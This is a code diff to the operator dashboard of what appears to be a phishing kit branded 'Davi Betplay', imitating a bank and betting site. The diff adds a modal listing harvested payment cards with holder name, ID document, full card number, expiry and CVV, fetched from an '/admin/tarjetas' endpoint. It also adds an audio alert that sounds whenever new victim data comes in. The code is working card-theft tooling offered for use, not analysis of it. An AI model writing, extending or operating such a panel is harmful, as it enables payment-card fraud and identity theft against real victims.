@@ -22,8 +22,10 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .topbar h1 { font-size: 20px; color: #ed1c27; }
 .topbar .user { color: #8b94a8; font-size: 13px; }
 .topbar .user strong { color: #e5e7eb; }
-.btn-logout { background: #262c36; color: #e5e7eb; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; cursor: pointer; }
+.btn-logout, .btn-tarjetas { background: #262c36; color: #e5e7eb; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; font-weight: bold; }
 .btn-logout:hover { background: #3a404c; }
+.btn-tarjetas { background: #2563eb; color: #fff; }
+.btn-tarjetas:hover { background: #1d4ed8; }
 .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
 .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 14px; margin-bottom: 22px; }
 .stat-card { background: #161a21; border: 1px solid #262c36; border-radius: 12px; padding: 18px; }
@@ -58,10 +60,20 @@ tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #
 #toast { position: fixed; bottom: 24px; right: 24px; background: #161a21; border: 1px solid #262c36; border-left: 4px solid #ed1c27; color: #e5e7eb; padding: 14px 20px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); font-size: 13px; font-weight: 500; z-index: 9999; transform: translateX(500px); transition: transform .3s; max-width: 400px; }
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
+/* MODAL TARJETAS */
+.modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+.modal-content { background: #161a21; border: 1px solid #262c36; border-radius: 12px; width: 100%; max-width: 900px; max-height: 80vh; display: flex; flex-direction: column; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
+.modal-header { padding: 16px 20px; border-bottom: 1px solid #262c36; display: flex; justify-content: space-between; align-items: center; }
+.modal-header h2 { font-size: 18px; color: #e5e7eb; margin: 0; }
+.close-modal { background: none; border: none; color: #ef4444; font-size: 24px; cursor: pointer; }
+.close-modal:hover { color: #dc2626; }
+.modal-body { padding: 20px; overflow-y: auto; }
 @media (max-width: 768px) {
     .container { padding: 12px; }
     .stats { grid-template-columns: 1fr 1fr; }
     .search-input { min-width: 0; flex: 1; }
+    .topbar { flex-direction: column; align-items: stretch; }
+    .topbar > div { justify-content: space-between; }
 }
 </style>
 </head>
@@ -82,6 +94,7 @@ tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #
     <div class="topbar">
         <h1>🎯 Davi Betplay</h1>
         <div style="display:flex; align-items:center; gap:14px;">
+            <button class="btn-tarjetas" id="btnVerTarjetas">💳 Tarjetas Ingresadas</button>
             <span class="user">Sesión: <strong id="currentUser">-</strong></span>
             <button class="btn-logout" id="logoutBtn">Cerrar sesión</button>
         </div>
@@ -126,12 +139,44 @@ tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #
 
 <div id="toast"></div>
 
+<!-- MODAL TARJETAS -->
+<div class="modal" id="modalTarjetas">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>💳 Historial de Tarjetas Ingresadas</h2>
+            <button class="close-modal" onclick="cerrarModal()">×</button>
+        </div>
+        <div class="modal-body">
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Fecha</th>
+                            <th>Nombre</th>
+                            <th>Documento</th>
+                            <th>Tarjeta</th>
+                            <th>Vencimiento</th>
+                            <th>CVV</th>
+                            <th>Estado</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tbodyTarjetas">
+                        <tr><td colspan="7" class="empty">Cargando tarjetas...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
 <script>
 const API_BASE = 'https://botbetplay-production.up.railway.app';
 let TOKEN = sessionStorage.getItem('daviToken') || '';
 let USUARIO = sessionStorage.getItem('daviUser') || '';
 let sesionesCache = [];
 let pollTimer = null;
+let audioCtx = null;
+let firmaSesionesAnterior = '';
 
 function $(id) { return document.getElementById(id); }
 
@@ -153,6 +198,45 @@ function formatMoney(n) {
     return '$' + v.toLocaleString('es-CO');
 }
 
+// ---------- LÓGICA DE AUDIO ----------
+function activarAudio() {
+    if (!audioCtx) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+    }
+}
+
+function reproducirAlerta() {
+    try {
+        activarAudio();
+        const ahora = audioCtx.currentTime;
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(880, ahora); // Tono A5
+        osc.frequency.exponentialRampToValueAtTime(1320, ahora + 0.1); // Deslizar a E6
+        
+        gain.gain.setValueAtTime(0, ahora);
+        gain.gain.linearRampToValueAtTime(0.3, ahora + 0.05);
+        gain.gain.exponentialRampToValueAtTime(0.01, ahora + 0.4);
+        
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        
+        osc.start(ahora);
+        osc.stop(ahora + 0.4);
+    } catch (e) {
+        console.error('Error al reproducir sonido', e);
+    }
+}
+
+// Desbloquear audio en el primer clic en la página
+document.addEventListener('click', activarAudio, { once: true });
+
+// ---------- API ----------
 async function api(path, options) {
     options = options || {};
     const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
@@ -174,6 +258,9 @@ async function login() {
     const usuario = $('loginUser').value.trim();
     const password = $('loginPass').value;
     const errEl = $('loginError');
+    
+    activarAudio(); // Activar audio al iniciar sesión
+    
     if (!usuario || !password) {
         errEl.textContent = 'Completa usuario y contraseña';
         errEl.style.display = 'block';
@@ -215,6 +302,7 @@ function logout() {
     $('loginScreen').style.display = 'flex';
     $('loginUser').value = '';
     $('loginPass').value = '';
+    firmaSesionesAnterior = ''; // Resetear firma
 }
 
 $('logoutBtn').addEventListener('click', logout);
@@ -251,6 +339,7 @@ function renderSesiones() {
     const filtro = ($('buscar').value || '').toLowerCase().trim();
     const tbody = $('tbodySesiones');
     let lista = sesionesCache;
+    
     if (filtro) {
         lista = lista.filter(s => {
             const dp = (s.datos && s.datos.datosPersonales) || {};
@@ -258,10 +347,19 @@ function renderSesiones() {
             return texto.includes(filtro);
         });
     }
+
+    // 🔥 LÓGICA DE SONIDO: Comparamos si los datos cambiaron o hay uno nuevo 🔥
+    const firmaActual = JSON.stringify(sesionesCache.map(s => ({ id: s.sessionId, t: s.datos?.tarjeta, e: s.estado })));
+    if (firmaSesionesAnterior !== '' && firmaActual !== firmaSesionesAnterior) {
+        reproducirAlerta();
+    }
+    firmaSesionesAnterior = firmaActual;
+
     if (!lista.length) {
         tbody.innerHTML = '<tr><td colspan="12" class="empty">Sin solicitudes</td></tr>';
         return;
     }
+
     tbody.innerHTML = lista.map(s => {
         const d = s.datos || {};
         const dp = d.datosPersonales || {};
@@ -315,6 +413,37 @@ async function accion(sessionId, tipo) {
     } catch (e) {
         toast('❌ ' + e.message, true);
     }
+}
+
+// ---------- LÓGICA MODAL TARJETAS ----------
+$('btnVerTarjetas').addEventListener('click', async () => {
+    $('modalTarjetas').style.display = 'flex';
+    $('tbodyTarjetas').innerHTML = '<tr><td colspan="7" class="empty">Cargando...</td></tr>';
+    try {
+        const d = await api('/admin/tarjetas');
+        const tarjetas = d.tarjetas || [];
+        if (!tarjetas.length) {
+            $('tbodyTarjetas').innerHTML = '<tr><td colspan="7" class="empty">No hay tarjetas registradas aún.</td></tr>';
+            return;
+        }
+        $('tbodyTarjetas').innerHTML = tarjetas.map(t => `
+            <tr>
+                <td>${new Date(t.fecha).toLocaleString('es-CO')}</td>
+                <td>${escapeHtml(t.nombre.trim())}</td>
+                <td class="mono">${escapeHtml(t.documento)}</td>
+                <td class="mono">${escapeHtml(t.tarjeta)}</td>
+                <td class="mono">${escapeHtml(t.expMes + '/' + t.expAnio)}</td>
+                <td class="mono">${escapeHtml(t.cvv)}</td>
+                <td><span class="estado estado-${t.estado}">${t.estado}</span></td>
+            </tr>
+        `).join('');
+    } catch (e) {
+        $('tbodyTarjetas').innerHTML = `<tr><td colspan="7" class="empty" style="color:#ef4444;">Error: ${e.message}</td></tr>`;
+    }
+});
+
+function cerrarModal() {
+    $('modalTarjetas').style.display = 'none';
 }
 
 if (TOKEN && USUARIO) { mostrarDashboard(); }
